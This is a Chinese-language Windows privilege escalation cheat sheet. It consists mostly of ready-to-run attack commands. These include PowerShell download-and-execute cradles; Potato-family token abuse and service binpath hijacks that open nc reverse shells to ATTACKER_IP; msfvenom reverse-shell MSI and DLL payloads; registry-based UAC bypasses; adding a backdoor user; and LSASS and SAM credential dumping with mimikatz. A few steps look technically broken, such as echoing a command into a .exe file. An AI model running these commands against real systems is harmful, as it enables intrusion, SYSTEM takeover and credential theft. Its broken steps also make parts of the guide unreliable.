# Windows Privilege Escalation — Windows 提权方法论

> Web 服务器运行在 Windows 上并不少见——IIS + ASP.NET、XAMPP、甚至容器化的 Windows 应用。从 IIS 的 IUSR 到 SYSTEM，Token 滥用、服务配置缺陷、UAC 绕过是三条最稳定的路径。

## 关键词

`Windows提权` `Windows PE` `SeImpersonate` `JuicyPotato` `RottenPotato` `PrintSpoofer` `SweetPotato` `GodPotato` `UAC绕过` `UAC bypass` `fodhelper` `computerdefaults` `AlwaysInstallElevated` `未引用服务路径` `Unquoted Service Path` `服务权限` `弱权限` `icacls` `DLL劫持` `计划任务` `Scheduled Task` `Token窃取` `whoami /priv` `systeminfo` `补丁对比` `msf提权` `powerup` `winpeas` `Watson` `CVE` `MS16-032` `CVE-2021-1732`

---

## 1. 信息收集

### 1.1 一键收集

```powershell
# winpeas (Windows PE 瑞士军刀)
# 上传 winpeas.exe → 运行
winpeas.exe > pe_report.txt
# 重点看: User Privileges, Services, Applications, Scheduled Tasks

# PowerUp (PowerShell)
powershell -c "IEX(New-Object Net.WebClient).DownloadString('http://IP/PowerUp.ps1'); Invoke-AllChecks"

# Watson (补丁级枚举)
Watson.exe

# Seatbelt
Seatbelt.exe -group=all

# PrivescCheck (PowerShell, 更现代)
powershell -ep bypass -c "IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/itm4n/PrivescCheck/master/PrivescCheck.ps1'); Invoke-PrivescCheck"
```

### 1.2 手动信息收集

```cmd
REM 基本信息
whoami /all                    REM 用户、组、特权 (Se*Privilege 关键!)
systeminfo                     REM 补丁信息
hostname
echo %OS% %PROCESSOR_ARCHITECTURE%

REM 用户与组
net user
net localgroup
net localgroup Administrators
whoami /groups

REM 网络
ipconfig /all
netstat -ano
route print

REM 进程与服务
tasklist /svc
sc query state= all | findstr "SERVICE_NAME"
wmic service get name,pathname,startname,startmode

REM 文件权限
icacls "C:\Program Files" /T 2>nul | findstr "Everyone"
icacls "C:\inetpub" /T 2>nul | findstr "IUSR"

REM 计划任务
schtasks /query /fo LIST /v | findstr /i "TaskName"
schtasks /query /fo LIST /v | findstr /i "exe"
dir C:\Windows\Tasks

REM 安装的补丁
wmic qfe get Caption,Description,HotFixID,InstalledOn
dism /online /get-packages

REM 启动项
wmic startup get command,caption
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Run
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run

REM 敏感文件
dir /s /b C:\*.kdbx C:\*.rdp C:\*vnc*.ini C:\*config*.xml 2>nul
findstr /s /i password *.txt *.ini *.xml *.config 2>nul
```

---

## 2. Token 滥用（Potato 家族）

### 2.1 原理

```
Windows 服务账户 (如 IIS APPPOOL\DefaultAppPool) 通常有 SeImpersonatePrivilege。
此特权允许进程模拟客户端的安全上下文。

三步走:
1. 发起本地连接 → SYSTEM 账户来认证（NTLM）
2. 捕获 SYSTEM Token
3. 用 Token 创建新进程 → SYSTEM
```

### 2.2 判断与攻击矩阵

```powershell
# 检查特权
whoami /priv
# 如果包含:
# SeImpersonatePrivilege    Enabled
# SeAssignPrimaryTokenPrivilege  Enabled
# → Potato 家族可用!

# 如果只有 SeImpersonate:
# → JuicyPotato / RoguePotato / GodPotato

# 如果两个都有:
# → 任意 Potato 均可
```

| 工具 | 适用 OS | 特点 | 2026 状态 |
|------|---------|------|-----------|
| **GodPotato** | Server 2012~2022, Win8~11 | DCOM+RPC, 最佳通用 | ✅ 首选 |
| **CoercedPotato** | Server 2016+, Win10+ | MS-EFSR RPC, Spooler 不用 | ✅ 可用 |
| **JuicyPotatoNG** | Win10 1903+, Server 2022 | Kerberos DCOM trick | ✅ 可用 |
| **PrintSpoofer** | Win10/Server 2016/2019 | 需 Spooler 运行 | ✅ 可用 |
| **RoguePotato** | Win10 1809+/Server 2019 | 需攻击机 relay socat | ✅ 可用 |
| **RustPotato** | Win10/11, Server 2016+ | 🆕 2026.03 Rust 重写 GodPotato | ✅ 最新 |
| JuicyPotato | Win7~Win10 1809 | ❌ 1809+ 已修复 | ❌ 淘汰 |

### 2.3 RustPotato (2026.03 最新)

```cmd
REM GodPotato 的 Rust 重写版，TCP 反弹 shell + NTAPI 间接调用
REM https://github.com/safedv/RustPotato
REM 特点: DCOM RPC dispatch 表劫持, 绕过某些 EDR hook
RustPotato.exe --rev ATTACKER_IP:4444
RustPotato.exe --cmd "whoami"
```

### 2.3 JuicyPotato 利用

```cmd
REM JuicyPotato 需要 CLSID（按 OS 版本选）
REM CLSID 列表: https://github.com/ohpe/juicy-potato/tree/master/CLSID

REM 执行命令
JuicyPotato.exe -l 1337 -p c:\windows\system32\cmd.exe -a "/c whoami > C:\inetpub\wwwroot\out.txt" -t * -c {4991d34b-80a1-4291-83b6-3328366b9097}

REM 反弹 shell
JuicyPotato.exe -l 1337 -p c:\windows\system32\cmd.exe -a "/c powershell -e <BASE64_REVERSE_SHELL>" -t * -c {CLSID}

REM 直接运行恶意 exe
JuicyPotato.exe -l 1337 -p C:\tmp\nc.exe -a "ATTACKER_IP 4444 -e cmd.exe" -t * -c {CLSID}
```

### 2.4 PrintSpoofer (更简单)

```cmd
REM 适用: Win10 / Server 2016/2019
REM 不需要 CLSID，直接用
PrintSpoofer.exe -c "powershell -c whoami"
PrintSpoofer.exe -c "C:\tmp\nc.exe ATTACKER_IP 4444 -e cmd"
PrintSpoofer.exe -i -c "cmd"   REM 交互式 shell
```

### 2.5 GodPotato (最新最通用)

```cmd
REM 支持 Win8 ~ Win11 / Server 2012 ~ 2022
GodPotato.exe -cmd "cmd /c whoami"
GodPotato.exe -cmd "C:\tmp\nc.exe ATTACKER_IP 4444 -e cmd"
```

---

## 3. 服务配置缺陷

### 3.1 弱服务权限

```cmd
REM 枚举当前用户对服务的权限
REM 使用 accesschk (Sysinternals)
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
accesschk.exe -uwcqv "Everyone" * /accepteula
accesschk.exe -uwcqv "IIS AppPool\DefaultAppPool" * /accepteula

REM 或 PowerShell
Get-Service | ForEach-Object {
    $sddl = sc.exe sdshow $_.Name
    if ($sddl -match "A;.*;.*WD.*") { Write-Host "Writable: $_" }
}

REM 如果是可修改的服务 → 更改 binpath
sc config VulnService binpath= "C:\tmp\nc.exe ATTACKER_IP 4444 -e cmd"
sc stop VulnService; sc start VulnService
REM → 以服务账户（通常是 SYSTEM）启动
```

### 3.2 Unquoted Service Path（未引用路径）

```cmd
REM 检查路径中包含空格且未加引号的服务
wmic service get name,pathname | findstr /i /v "C:\Windows" | findstr /i /v """
REM 例如: C:\Program Files\MyApp\service.exe
REM 当启动此服务时，Windows 按顺序尝试:
REM   C:\Program.exe
REM   C:\Program Files\MyApp\service.exe

REM 如果 C:\Program Files\MyApp\ 可写
echo 'net user antigravity Password123! /add' > "C:\Program Files\MyApp\service.exe"
REM 重启服务 → 恶意 exe 以 SYSTEM 执行
```

### 3.3 AlwaysInstallElevated

```cmd
REM 检查注册表（两个键必须同时为 1）
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

REM 如果都是 1 → 任何 .msi 文件以 SYSTEM 执行
REM 生成恶意 MSI:
msfvenom -p windows/x64/shell_reverse_tcp LHOST=IP LPORT=4444 -f msi -o pwn.msi
REM 在目标机运行:
msiexec /quiet /qn /i C:\tmp\pwn.msi
```

---

## 4. UAC 绕过

### 4.1 判断 UAC 级别

```cmd
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA
REM 1 = 启用

reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v ConsentPromptBehaviorAdmin
REM 0 = 不提示, 2 = 提示同意, 5 = 提示凭证

whoami /groups | findstr /i "Medium"
REM 如果显示 Medium Mandatory Level → UAC 限制存在
REM 如果显示 High Mandatory Level → 已是管理员
```

### 4.2 经典 UAC 绕过

```powershell
# ====== fodhelper.exe (Win10/11) ======
# 原理: fodhelper.exe 是自动提升的 Windows 程序，
# 以高完整性执行时读取注册表中的特定键值运行外部程序

reg add HKCU\Software\Classes\ms-settings\Shell\open\command /d "cmd.exe /c C:\tmp\nc.exe IP 4444 -e cmd" /f
reg add HKCU\Software\Classes\ms-settings\Shell\open\command /v DelegateExecute /t REG_SZ /d "" /f
fodhelper.exe
# → 高完整性 cmd 执行，无 UAC 弹窗

# ====== computerdefaults.exe (Win10 1809+) ======
reg add HKCU\Software\Classes\ms-settings\Shell\open\command /d "cmd.exe /c whoami > C:\tmp\out.txt" /f
reg add HKCU\Software\Classes\ms-settings\Shell\open\command /v DelegateExecute /t REG_SZ /f
computerdefaults.exe

# ====== SilentCleanup (Win8+) ======
reg add HKCU\Environment /v windir /d "cmd.exe /c whoami > C:\tmp\out.txt &" /f
schtasks /Run /TN \Microsoft\Windows\DiskCleanup\SilentCleanup /I

# ====== eventvwr.exe (Win7~10) ======
# 劫持 mmc.exe 的注册表
reg add HKCU\Software\Classes\mscfile\shell\open\command /d "cmd.exe /c whoami" /f
eventvwr.exe
```

---

## 5. DLL 劫持

### 5.1 枚举

```cmd
REM 查找以 SYSTEM 运行且加载非系统目录 DLL 的进程
REM 工具: Process Monitor (procmon) + DLL 筛选
REM 或用 PowerUp: Invoke-AllChecks → DLL Hijacking 部分

REM 常见劫持目标 DLL (Windows 搜索顺序):
REM 排在搜索路径前面的可写目录中的 DLL
# - profapi.dll
# - version.dll
# - userenv.dll
# - cscapi.dll
```

### 5.2 生成恶意 DLL

```bash
# 用 msfvenom 生成
msfvenom -p windows/x64/shell_reverse_tcp LHOST=IP LPORT=4444 -f dll -o hijack.dll

# 或 C 源码:
# BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved) {
#     if (fdwReason == DLL_PROCESS_ATTACH) {
#         system("cmd.exe /c whoami > C:\\tmp\\out.txt");
#     }
#     return TRUE;
# }
```

---

## 6. 计划任务劫持

```cmd
REM 枚举计划任务
schtasks /query /fo LIST /v > tasks.txt
REM 找: 1) 以 SYSTEM 运行 2) 脚本可写 3) 参数可注入

REM 检查任务目录权限
icacls "C:\Program Files (x86)\App\task_script.bat"
REM 如果当前用户有 (W) → 编辑脚本添加
echo 'C:\tmp\nc.exe IP 4444 -e cmd' >> "C:\Program Files (x86)\App\task_script.bat"

REM 或手动触发任务
schtasks /Run /TN "VulnerableTask"
```

---

## 7. 凭据窃取

```cmd
REM ====== 内存中的明文密码 ======
procdump.exe -accepteula -ma lsass.exe lsass.dmp
mimikatz.exe "sekurlsa::minidump lsass.dmp" "sekurlsa::logonPasswords" exit

REM ====== SAM/SYSTEM 提取 ======
reg save HKLM\SAM SAM.hive
reg save HKLM\SYSTEM SYSTEM.hive
mimikatz.exe "lsadump::sam SAM.hive SYSTEM.hive" exit

REM ====== 保存的凭据 ======
cmdkey /list
dir C:\Users\*\AppData\Local\Microsoft\Credentials\*
dir C:\Users\*\AppData\Roaming\Microsoft\Credentials\*

REM ====== PowerShell History ======
type C:\Users\*\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
```

---

## 8. Windows 内核 CVE 速查

| CVE | 适用版本 | 类型 |
|-----|---------|------|
| MS16-032 | Win7/2008R2 | 辅助功能漏洞 |
| CVE-2021-1732 | Win10 (1809~1909) | win32k UAF |
| CVE-2021-36934 | Win10 (1809+) | SAM hive 读取(=Shadow Volume) |
| CVE-2022-21882 | Win10/11 | win32k UAF |
| CVE-2023-21768 | Win7~Win11 | AFD 权限提升 |
| **CVE-2025-60718** | **Win11 24H2+ (Admin Protection)** | **🔴 9 个内核设计缺陷链（Forshaw）** |

## 9. CVE-2025-60718 — Windows Administrator Protection 绕过

```powershell
# Google Project Zero 研究员 James Forshaw 发现 9 个 PE 绕过链
# 针对 Windows 11 新 "Administrator Protection" 安全模型 (2025.12)

# 核心链:
# 1. 模拟 Shadow Admin Token (identification level)
# 2. 利用 DOS 设备对象目录延迟初始化 → 获得目录所有权
# 3. 插入 symlink 重定向系统路径 → 加载恶意代码
# 4. 提权进程 → SYSTEM

# 结果: Microsoft 临时禁用了 Admin Protection 功能
# 补丁: 2026 安全更新
```

---

## 10. 一键自动化：WinPE.ps1

```powershell
# WinPE.ps1 — Windows 提权一键探测
# 用法: powershell -ep bypass -f WinPE.ps1

Write-Host "=== User ===" -ForegroundColor Cyan
whoami /all | Select-String "Privilege|Group|User Name"

Write-Host "`n=== Patches ===" -ForegroundColor Cyan
$patches = (Get-HotFix | Select-Object HotFixID,InstalledOn | Sort-Object InstalledOn -Descending)
$patches | Select-Object -First 10 | Format-Table

Write-Host "`n=== Services (非标准路径) ===" -ForegroundColor Cyan
Get-WmiObject win32_service | Where-Object {
    $_.PathName -match "^[A-Za-z]:" -and
    $_.PathName -notmatch "^C:\\Windows" -and
    $_.PathName -notmatch "^C:\\Program Files"
} | Select-Object Name,PathName,StartName | Format-Table -AutoSize

Write-Host "`n=== Unquoted Service Paths ===" -ForegroundColor Cyan
Get-WmiObject win32_service | Where-Object {
    $_.PathName -match "^[A-Z]:\\[^"']+\s" -and $_.PathName -notmatch '"'
} | Select-Object Name,PathName | Format-Table -AutoSize

Write-Host "`n=== AlwaysInstallElevated ===" -ForegroundColor Cyan
$hkcu = Get-ItemProperty "HKCU:\SOFTWARE\Policies\Microsoft\Windows\Installer" -Name AlwaysInstallElevated -ErrorAction SilentlyContinue
$hklm = Get-ItemProperty "HKLM:\SOFTWARE\Policies\Microsoft\Windows\Installer" -Name AlwaysInstallElevated -ErrorAction SilentlyContinue
if ($hkcu.AlwaysInstallElevated -eq 1 -and $hklm.AlwaysInstallElevated -eq 1) {
    Write-Host "[!] AlwaysInstallElevated ENABLED — 生成 .msi → msiexec /i pwn.msi → SYSTEM" -ForegroundColor Red
}

Write-Host "`n=== Writable Service Binaries ===" -ForegroundColor Cyan
Get-WmiObject win32_service | Where-Object { $_.PathName -match '^"?(.+\.exe)' } | ForEach-Object {
    $path = ($_.PathName -replace '^"([^"]+).*','$1' -replace '^([^" ]+).*','$1')
    if (Test-Path $path) {
        try { $acl = Get-Acl $path -ErrorAction Stop
            if ($acl.Access | Where-Object { $_.FileSystemRights -match "Modify|FullControl|Write" -and $_.IdentityReference -match "Everyone|Authenticated Users|Users|BUILTIN" }) {
                Write-Host "[!] $path 可写! → 替换为恶意 exe" -ForegroundColor Red
            }
        } catch {}
    }
}

Write-Host "`n=== Scheduled Tasks ===" -ForegroundColor Cyan
schtasks /query /fo CSV /v | ConvertFrom-Csv | Where-Object { $_.TaskName -notmatch "Microsoft" -and $_.TaskName -notmatch "^\\$" } | Select-Object TaskName,"Task To Run" | Format-Table -AutoSize

Write-Host "`n=== Credentials (Saved) ===" -ForegroundColor Cyan
cmdkey /list 2>$null

Write-Host "`n=== AutoLogon ===" -ForegroundColor Cyan
Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" -ErrorAction SilentlyContinue | Select-Object DefaultUserName,DefaultPassword

Write-Host "`n=== Check SeImpersonate → run GodPotato/PrintSpoofer ===" -ForegroundColor Green
whoami /priv | Select-String "SeImpersonatePrivilege" | ForEach-Object { Write-Host "[!] Potato 家族可用!" -ForegroundColor Red }
```

## 11. 关联技术

- [[00-overview]] — PE 全景
- [[01-linux-sudo-suid]] — Linux SUID/SUDO
- [[03-linux-kernel-cve]] — Linux 内核 CVE
